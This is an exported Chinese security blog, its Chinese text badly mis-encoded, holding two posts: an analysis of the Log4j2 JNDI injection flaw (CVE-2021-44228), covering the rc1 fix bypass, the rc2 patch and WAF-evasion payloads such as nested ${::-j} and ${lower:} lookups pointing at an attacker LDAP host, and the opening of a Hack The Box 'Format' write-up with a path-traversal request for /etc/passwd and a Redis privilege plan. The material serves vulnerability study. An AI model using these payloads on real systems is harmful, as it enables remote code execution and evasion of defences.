<h3 id="ï¼ˆäºŒï¼‰2-15-0-rc2"><a href="#ï¼ˆäºŒï¼‰2-15-0-rc2" class="headerlink" title="ï¼ˆäºŒï¼‰2.15.0-rc2"></a>ï¼ˆäºŒï¼‰2.15.0-rc2</h3><h4 id="1-rc1ä¸­å­˜åœ¨çš„é—®é¢˜"><a href="#1-rc1ä¸­å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="1. rc1ä¸­å­˜åœ¨çš„é—®é¢˜"></a>1. rc1ä¸­å­˜åœ¨çš„é—®é¢˜</h4><p>rc1é‡Œä¸»è¦ä¿®å¤çš„<code>JndiManager.lookup()</code>æ–¹æ³•çš„æ•´ä½“é€»è¾‘ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">T</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token class-name">URI</span> uri <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URI</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedProtocols<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span>ROOT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>LDAP<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> LDAPS<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedHosts<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
                    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedClasses<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
                                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>
                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">URISyntaxException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// This is OK.</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä»ä¸Šé¢çš„ä»£ç ç»“æ„ä¸­å¯ä»¥æ€»ç»“å¦‚ä¸‹çš„é€»è¾‘ï¼š</p>
<ul>
<li>å¯¹ä¼ å…¥çš„<code>name</code>å‚æ•°è¿›è¡Œå‰é¢æåˆ°çš„ä¸‰ç±»ç™½åå•æ£€æŸ¥ã€‚å¦‚æœæ£€æŸ¥ä¸é€šè¿‡ï¼Œåˆ™ç›´æ¥è¿”å›<code>null</code>ã€‚</li>
<li>å¦‚æœäº§ç”Ÿ<code>URISyntaxException</code>ï¼Œåˆ™å¯¹è¯¥å¼‚å¸¸å¿½ç•¥ï¼Œç»§ç»­æ‰§è¡Œ<code>this.context.lookup(name)</code>ã€‚</li>
<li>å¦‚æœæœªäº§ç”Ÿ<code>URISyntaxException</code>ï¼Œåˆ™æ‰§è¡Œ<code>this.context.lookup(name)</code>ã€‚</li>
</ul>
<p>é‡ç‚¹å…³æ³¨<code>catch</code>ä»£ç å—ï¼Œrc1é»˜è®¤ä¸å¯¹<code>URISyntaxException</code>å¼‚å¸¸åšä»»ä½•å¤„ç†ï¼Œç»§ç»­æ‰§è¡Œåç»­é€»è¾‘ï¼Œå³<code>this.context.lookup(name)</code>ã€‚</p>
<p>å†çœ‹ä¸‹<code>try</code>ä»£ç å—ä¸­å¯èƒ½äº§ç”Ÿ<code>URISyntaxException</code>çš„åœ°æ–¹ã€‚å¥½å·§ä¸å·§ï¼Œ<code>try</code>ä»£ç å—çš„ç¬¬ä¸€ä¸ªè¯­å¥å°±å¯èƒ½äº§ç”Ÿè¯¥å¼‚å¸¸ï¼š<code>URI uri = new URI(name);</code>ã€‚</p>
<p>è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœèƒ½æ„é€ æŸä¸ªç‰¹æ®Šçš„URIï¼Œå¯¼è‡´<code>URI uri = new URI(name);</code>è¯­å¥è§£æURIå¼‚å¸¸ï¼ŒæŠ›å‡º<code>URISyntaxException</code>ï¼Œä½†åˆèƒ½è¢«<code>this.context.lookup(name)</code>æ­£ç¡®å¤„ç†ï¼Œä¸å°±å¯ä»¥ç»•è¿‡äº†å—ï¼Ÿä¾‹å¦‚æ„å»ºä¸€ä¸ªå¸¦ç©ºæ ¼çš„URIåœ°å€ï¼ˆ<code>${jndi:ldap://127.0.0.1:1389/ Exp}</code>ï¼Œç”±äºæ’°å†™æœ¬æ–‡æ—¶æ— æ³•æ„å»ºrc1ä»£ç ï¼Œæ•…å¯å‚è€ƒ<a href="https://www.freebuf.com/vuls/316143.html%EF%BC%89">https://www.freebuf.com/vuls/316143.htmlï¼‰</a></p>
<h4 id="2-rc2çš„ä¿®å¤æ–¹æ¡ˆ"><a href="#2-rc2çš„ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="2. rc2çš„ä¿®å¤æ–¹æ¡ˆ"></a>2. rc2çš„ä¿®å¤æ–¹æ¡ˆ</h4><p>é€šè¿‡æ¯”è¾ƒ2.15.0-rc1å’Œ2.15.0-rc2ä¹‹é—´çš„å·®å¼‚ï¼Œå¯ä»¥å‘ç°Log4j2å›¢é˜Ÿåœ¨12æœˆ10æ—¥æäº¤äº†ä¸€ä¸ªåä¸º<code>Handle URI exception</code>çš„commitã€‚è¯¥commitçš„è¯¦ç»†å†…å®¹å¦‚ä¸‹é“¾æ¥ï¼š</p>
<p><a href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658">https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658</a></p>
<p>è¯¥commitä¸»è¦å†…å®¹æ˜¯å¯¹rc1ä¸­<code>JndiManager.lookup()</code>æ–¹æ³•é‡Œçš„<code>catch</code>ä»£ç å—è¿›è¡Œäº†ä¿®æ”¹ï¼šå½“<code>URISyntaxException</code>å¼‚å¸¸è¢«æ•è·æ—¶ï¼Œç›´æ¥è¿”å›<code>null</code>ã€‚ä»è€Œé¿å…äº†ä¸Šé¢æåˆ°çš„ç»•è¿‡æ€è·¯ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019211658860.png"></p>
<h2 id="å››ã€WAFç»•è¿‡"><a href="#å››ã€WAFç»•è¿‡" class="headerlink" title="å››ã€WAFç»•è¿‡"></a>å››ã€WAFç»•è¿‡</h2><p>å„å¤§å‚å•†é’ˆå¯¹log4j2æ¼æ´åº”æ€¥æ–¹æ¡ˆé›†åˆï¼š<a href="https://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g">https://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g</a></p>
<p>ç”±äºLog4j2æ¡†æ¶å‡ ä¹æ˜¯ä¸€ä¸ªç±»ä¼¼JDKçº§åˆ«çš„åŸºç¡€ç±»åº“ï¼Œå³ä¾¿è‡ªèº«åº”ç”¨ç¨‹åºé‡Œå®Œæˆäº†å‡çº§ï¼Œä½†å¤§é‡å­˜åœ¨ä¾èµ–å¼•å…¥çš„å…¶å®ƒæ¡†æ¶ã€ä¸­é—´ä»¶å¯¼è‡´å‡çº§å·¥ä½œæä¸ºå›°éš¾ï¼Œç”šè‡³åœ¨å‡ å¹´å†…éƒ½æ— æ³•è¾¾åˆ°ä¸€ä¸ªå¯æ¥å—çš„æ°´å¹³ã€‚ç›®å‰ï¼Œç»å¤§éƒ¨åˆ†å…¬å¸é‡‡å–åœ¨è¾¹ç•Œé˜²æŠ¤è®¾å¤‡ä¸Šä½¿ç”¨â€œä¸´æ—¶è¡¥ä¸â€çš„æ–¹å¼ã€‚åŒæ—¶ï¼Œå¤§é‡bypassæ–¹æ³•ä¹Ÿéšä¹‹è€Œæ¥ï¼Œè¿™å°†æ˜¯ä¸€ä¸ªæ¼«é•¿çš„è¿‡ç¨‹ã€‚</p>
<p>WAFä¸»è¦æ€è·¯æ˜¯è¿‡æ»¤jndiã€ldapã€rmiç­‰å…³é”®å­—ï¼›è¿‡æ»¤<code>ip:port</code></p>
<p>åŸå§‹payload</p>
<pre class="line-numbers language-none"><code class="language-none">${jndi:ldap://malicious-ldap-server.com/Exp}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="ï¼ˆä¸€ï¼‰ç»•è¿‡æ€è·¯1"><a href="#ï¼ˆä¸€ï¼‰ç»•è¿‡æ€è·¯1" class="headerlink" title="ï¼ˆä¸€ï¼‰ç»•è¿‡æ€è·¯1"></a>ï¼ˆä¸€ï¼‰ç»•è¿‡æ€è·¯1</h3><p>å‰é¢åˆ†ææåˆ°è¿‡ï¼ŒStrSubstitutoré¦–å…ˆä¼šåŒ¹é…<code>${</code>ï¼Œç„¶åè¿˜ä¼šåŒ¹é…<code>:-</code></p>
<p>ä»¥<code>${${::-j}ndi:${::-l}dap://127.0.0.1:1389/Exp}</code>ä¸ºä¾‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020203630144.png" style="zoom:80%;">

<p>å¦‚æœæ‰¾åˆ°<code>:-</code>ï¼Œå°±æˆªå–<code>:-</code>ä¹‹å‰çš„å˜é‡èµ‹å€¼ç»™varNameï¼Œæˆªå–<code>:-</code>åˆ°æœ«å°¾çš„å­—ç¬¦ä¸²èµ‹å€¼ä¸ºvarDefaultValveï¼Œç„¶åå°±è·³å‡ºå¾ªç¯ã€‚</p>
<p>ç„¶åä½¿ç”¨resolveVariable() å¯¹varNameçš„å†…å®¹è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸åŒ¹é…ä»»ä½•log4j2æ”¯æŒçš„åè®®ï¼Œå°±è¿”å›nullï¼ˆè¿™é‡ŒvarNameçš„å€¼ä¸º<code>:</code>ï¼‰ã€‚ä¹‹åå°±ä¼šæŠŠvarDefaultValveçš„å€¼ï¼ˆè¿™é‡Œä¸º<code>j</code>ï¼‰èµ‹ç»™varValueã€‚ç„¶åå†ç”¨varValueæ›¿æ¢æ•´ä¸ª<code>${::-j}</code>ï¼Œå³æœ€åç»“æœä¸º<code>jndi:ldap://127.0.0.1:1389/Exp</code>ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020203728230.png"></p>
<p>æ‰€ä»¥ç»•è¿‡çš„æ–¹æ³•å¯ä»¥æ˜¯ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">${ä»»æ„å­—ç¬¦ä¸²:-å®é™…æƒ³è¦çš„å­—ç¬¦ä¸²} = å®é™…æƒ³è¦çš„å­—ç¬¦ä¸²<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/Exp}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>æ³¨æ„ï¼š</strong>è¿™é‡Œçš„ä»»æ„å­—ç¬¦ä¸²ä¸èƒ½ä¸ºlog4j2æ”¯æŒçš„Interpolatorå‰ç¼€ã€‚</p>
<h3 id="ï¼ˆäºŒï¼‰ç»•è¿‡æ€è·¯2"><a href="#ï¼ˆäºŒï¼‰ç»•è¿‡æ€è·¯2" class="headerlink" title="ï¼ˆäºŒï¼‰ç»•è¿‡æ€è·¯2"></a>ï¼ˆäºŒï¼‰ç»•è¿‡æ€è·¯2</h3><p>Interpolatoré™¤jndiå¤–ï¼Œè¿˜æ”¯æŒè§£æå¾ˆå¤šå…¶å®ƒå‰ç¼€ï¼Œå¦‚<code>env</code>ã€<code>lower</code>ã€<code>upper</code>ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å¦‚ä¸‹æ€è·¯æ¥å¤„ç†å…³é”®å­—ï¼ˆéƒ¨åˆ†ç‰ˆæœ¬ä¸æ”¯æŒ<code>lower</code>ã€<code>upper</code>ç­‰åè®®ï¼‰ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1:1389/Exp}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="ï¼ˆä¸‰ï¼‰ç»•è¿‡æ€è·¯3"><a href="#ï¼ˆä¸‰ï¼‰ç»•è¿‡æ€è·¯3" class="headerlink" title="ï¼ˆä¸‰ï¼‰ç»•è¿‡æ€è·¯3"></a>ï¼ˆä¸‰ï¼‰ç»•è¿‡æ€è·¯3</h3><p>é’ˆå¯¹è¿‡æ»¤<code>ip:port</code>ï¼Œå¯ç”¨åŸŸåä»£æ›¿æˆ–ç”¨é»˜è®¤ç«¯å£å¼€å¯ldapæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">${jndi:ldap://malicious-ldap-server.com/Exp}
${jndi:ldap://malicious-ip/Exp}	#æ­¤æ—¶éœ€è¦ldapæœåŠ¡ç«¯å£ä¸º389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="äº”ã€æ€è€ƒ"><a href="#äº”ã€æ€è€ƒ" class="headerlink" title="äº”ã€æ€è€ƒ"></a>äº”ã€æ€è€ƒ</h2><p>Log4j2æ¼æ´å°±å…¶è‡ªèº«åŸç†æ¥è¯´ï¼Œå¹¶ä¸å¤æ‚ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯jndiæ³¨å…¥ï¼Œåˆ†æè¿‡ç¨‹ä¹Ÿä¸»è¦èšç„¦äºjndiæ³¨å…¥çš„äº§ç”Ÿè¿‡ç¨‹ã€‚rc1ä¸­é‡‡ç”¨è¾ƒä¸ºä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ï¼Œä»åº”æ€¥å¤„ç†çš„è§’åº¦çœ‹æ— å¯åšéã€‚ä½†ä»å†å²ä¸Šå‘ç”Ÿçš„å„ç±»æ¼æ´ä¿®è¡¥è¿‡ç¨‹æ¥çœ‹ï¼Œå¿…å®šä¼šæœ‰å„ç§åœ°æ–¹é—æ¼å¯¼è‡´åç»­ä¸æ–­åœ°æ‰“è¡¥ä¸ã€‚å¯¹äºWAFçš„ç»•è¿‡ï¼Œçºµè§‚å¤ä»Šæ¼æ´ï¼Œå¾€å¾€èƒ½åœ¨æ¼æ´äº§ç”Ÿè·¯çº¿çš„å‘¨å›´æ‰¾åˆ°ç»•è¿‡æ€è·¯ï¼Œå°±åƒé«˜é€Ÿå…¬è·¯ä¸€æ ·ï¼Œæ€»ä¼šæœ‰â€œäº‹æ•…å¤šå‘è·¯æ®µâ€ã€‚ä»è½¯ä»¶å¼€å‘è§’åº¦è®²ï¼Œä¸å…¶åœ¨ä¸Šçº¿åä¸åœä¿®å¤æ‰“è¡¥ä¸ï¼Œä¸å¦‚åœ¨å¼€å‘æ—©æœŸï¼Œå³è®¾è®¡é˜¶æ®µæˆ–è€…å¼€å‘é˜¶æ®µï¼Œå°½é‡é¿å…è¿™ç±»æœ‰å¯èƒ½äº§ç”Ÿå®‰å…¨é£é™©çš„è®¾è®¡ã€‚åœ¨2.16.0ç‰ˆæœ¬ï¼ŒLog4j2å›¢é˜Ÿå¹²è„†é»˜è®¤ç¦ç”¨æ‰äº†JNDI LookupåŠŸèƒ½ã€‚</p>
<p>å¦å¤–ï¼Œrc1ä¸­<code>catch</code>ä»£ç å¯¹å¼‚å¸¸çš„å¤„ç†æ–¹å¼ï¼Œåœ¨æ—¥å¸¸å¼€å‘è¿‡ç¨‹ä¸­ä¹Ÿæ˜¯å®¹æ˜“çŠ¯çš„é—®é¢˜ã€‚è½¯ä»¶å¼€å‘ä¸­æœ‰ä¸€ä¸ªå®‰å…¨åŸåˆ™ï¼š<code>Fail Securely</code>ï¼Œæ„æ€æ˜¯ä¸šåŠ¡ç³»ç»Ÿèƒ½å¤Ÿæ­£ç¡®å®‰å…¨åœ°å¤„ç†å„ç§å¼‚å¸¸å’Œé”™è¯¯ã€‚è™½ç„¶ä¸šåŠ¡å¼€å‘æœ‰æ—¶ä¼šä¸ºäº†ä¾¿åˆ©æ€§è€Œç‰ºç‰²ä¸€éƒ¨åˆ†å®‰å…¨æ€§ï¼Œä½†å¯¹äºLog4jæ­¤ç±»ååº•å±‚çš„å¼ºä¾èµ–æ€§ç±»åº“ï¼Œè¿˜æ˜¯éœ€è¦ä¸¥æ ¼å¤„ç†å„ç§å¯èƒ½å‡ºç°çš„é”™è¯¯å’Œå¼‚å¸¸ã€‚</p>
<p>é˜¿é‡Œäº‘å·¥ç¨‹å¸ˆå‘ç°Apache Log4j2ç»„ä»¶æ¼æ´åï¼ŒæŒ‰ä¸šç•Œæƒ¯ä¾‹å‘è½¯ä»¶å¼€å‘æ–¹Apacheå¼€æºç¤¾åŒºæŠ¥å‘Šè¿™ä¸€é—®é¢˜ã€‚ä½†æœ€ç»ˆå·¥ä¿¡éƒ¨ç½‘ç»œå®‰å…¨ç®¡ç†å±€å†³å®šæš‚åœé˜¿é‡Œäº‘ä½œä¸ºä¸Šè¿°åˆä½œå•ä½6ä¸ªæœˆã€‚å¯¹æ­¤ï¼Œç¬”è€…æƒ³å¼•ç”¨è‰¾å…¬çš„ä¸€å¥è¯ä½œä¸ºç»“å°¾ï¼šå°Šä¸¥åªåœ¨å‰‘é”‹ä¹‹ä¸Šï¼ŒçœŸç†åªåœ¨å¤§ç‚®å°„ç¨‹ä¹‹å†…ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>è®°å½•ä¸€æ¬¡log4jå¤ç°ä¹‹æ—…ï¼ˆå¤ç°ä¸äº†ä½ æ¥æ‰¾æˆ‘ï¼‰ï¼š<a href="https://blog.csdn.net/lmboss/article/details/123927020">https://blog.csdn.net/lmboss/article/details/123927020</a></p>
<p>Log4j2çš„JNDIæ³¨å…¥æ¼æ´ï¼ˆCVE-2021-44228ï¼‰åŸç†åˆ†æä¸æ€è€ƒï¼š<a href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p>
<p>Apache Log4j2 Jndi RCE é«˜å±æ¼æ´åˆ†æä¸é˜²å¾¡ï¼š<a href="https://paper.seebug.org/1787/">https://paper.seebug.org/1787/</a></p>
<p><a href="https://myzxcg.com/2022/01/Log4j2-%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8EWaf%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">Log4j2 åˆ©ç”¨é“¾ä¸Wafç»•è¿‡åˆ†æ</a></p>
<p>Apache log4j2 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼š<a href="https://cloud.tencent.com/developer/article/2148989">https://cloud.tencent.com/developer/article/2148989</a></p>
<p>log4j waf ç»•è¿‡æŠ€å·§ï¼š<a href="https://www.cnblogs.com/ph4nt0mer/p/15701647.html">https://www.cnblogs.com/ph4nt0mer/p/15701647.html</a></p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
        <category>ç»†è¯»ç»å…¸</category>
      </categories>
      <tags>
        <tag>Log4j2</tag>
        <tag>JNDIæ³¨å…¥</tag>
        <tag>CVE-2021-44228ï¼ˆLog4j2ï¼‰</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Format</title>
    <url>/posts/ec5f74de.html</url>
    <content><![CDATA[<h1 id="HTB-Format"><a href="#HTB-Format" class="headerlink" title="HTB-Format"></a>HTB-Format</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ä¿¡æ¯æ”¶é›†ä¸»é¡µè¶…é“¾æ¥æ‰¾åˆ°æºç ï¼›</p>
<p>2.æºç å®¡è®¡æœ¬åœ°æ–‡ä»¶åŒ…å«+redisæœªæˆæƒï¼›</p>
<p>3.redisæœªæˆæƒå‚ç›´è¶Šæƒï¼›</p>
<p>4.æœ¬åœ°æ–‡ä»¶åŒ…å«é…åˆæºç æ¼æ´å†™åå¼¹shellï¼›</p>
<p>5.sudo -lå‘ç°æ•æ„Ÿæ–‡ä»¶ï¼›</p>
<p>6.pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–rootæƒé™ã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>ç«¯å£æœåŠ¡æ‰«æ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230926151139659.png"></p>
<p>æœ‰ä¸€ä¸ªåŸŸå<code>microblog.htb</code>å’Œéå¸¸è§„ç«¯å£3000</p>
<p>80ç«¯å£å¼€æ”¾ï¼Œé‚£ä¹ˆç›´æ¥è®¿é—®IPå‘ç°ä¼šè‡ªåŠ¨è·³è½¬åˆ°<code>http://app.microblog.htb/</code></p>
<p>é‚£å°±æŠŠä¸¤ä¸ªåŸŸåæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.213 microblog.htb app.microblog.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è®¿é—®<code>microblog.htb</code>æ˜¯404ï¼Œè®¿é—®<code>app.microblog.htb</code>å¦‚ä¸‹å›¾</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927093055876.png" style="zoom:67%;">

<p>æœ‰ç™»å½•å’Œæ³¨å†ŒåŠŸèƒ½ç‚¹ï¼Œåº•éƒ¨æœ‰è¶…é“¾æ¥</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927093202732.png" style="zoom:67%;">

<p>ç‚¹å‡»<code>Contribute here</code>è¶…é“¾æ¥ï¼Œè·³è½¬åˆ°å¦‚ä¸‹å›¾ç•Œé¢ï¼Œæ˜¯æºç </p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927094123462.png" style="zoom:67%;">

<p>æ³¨å†Œä¸ªtestç”¨æˆ·ï¼Œç„¶åä¼šè‡ªåŠ¨ç™»å½•ï¼Œæ–°å»ºä¸€ä¸ªBlog</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927102245811.png" style="zoom: 50%;">

<p>æ–°å»ºæˆåŠŸåï¼Œç‚¹å‡»<code>Edit Site</code>ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°<code>http://test.microblog.htb/edit/</code>ï¼Œæ‰€ä»¥éœ€è¦æŠŠ<code>test.microblog.htb</code>æ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927102332626.png" style="zoom: 50%;">

<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.213 test.microblog.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ·»åŠ å¥½åï¼Œå†æ¬¡ç‚¹å‡»<code>Edit Site</code>ï¼Œä¼šè·³è½¬åˆ°å¦‚ä¸‹å›¾ç•Œé¢</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927102535862.png" style="zoom:50%;">

<p>h1å’Œtxtæ˜¯ä¸¤ä¸ªè®¾ç½®é€‰é¡¹ï¼Œå¯ä»¥è®¾ç½®headerå’Œtxtï¼ŒæŠ“åŒ…å¯çœ‹åˆ°POSTä¼ å‚åˆ†åˆ«æ˜¯<code>id=c0mdsvzdfum&amp;header=headertest</code>ã€<code>id=jyjs1v121x&amp;txt=txttest</code></p>
<h2 id="ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼‰"><a href="#ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼‰" class="headerlink" title="ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼‰"></a>ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼‰</h2><p>çœ‹æºç <code>microblog-template\edit\index.php</code>å‘ç°idå­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´ï¼Œå¯¹POSTå‚æ•°æ²¡æœ‰ä¸æ¯«è¿‡æ»¤</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927104606899.png"></p>
<p>POSTä¼ å‚<code>id=../../../../../../../../../../etc/passwd&amp;header=headertest</code>ï¼Œå¦‚ä¸‹å›¾å®ç°LFI</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927110038896.png"></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927110023429.png" style="zoom: 50%;">

<p>å†çœ‹ä»£ç ï¼Œå¦‚æœ<code>isPro</code>æ¡ä»¶ä¸º<code>True</code>ï¼Œå³ç”¨æˆ·èº«ä»½æ˜¯Proï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚äºæ˜¯æƒ³åŠæ³•æŠŠç”¨æˆ·å˜æˆproæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927180629747.png"></p>
<h2 id="å››ã€redisæœªæˆæƒ"><a href="#å››ã€redisæœªæˆæƒ" class="headerlink" title="å››ã€redisæœªæˆæƒ"></a>å››ã€redisæœªæˆæƒ</h2><p>æºç ä¸­å¤šå¤„å‡ºç°<code>$redis-&gt;connect('/var/run/redis/redis.sock');</code></p>
<p>å¯ä»¥ç”¨redisæœªæˆæƒï¼Œé€šè¿‡redis socketï¼ˆ<code>unix:/var/run/redis/redis.sock</code>ï¼‰ï¼Œè®¾ç½®testç”¨æˆ·çš„proä¸ºtrue</p>
<p><a href="https://redis.io/commands/hset/">https://redis.io/commands/hset/</a></p>
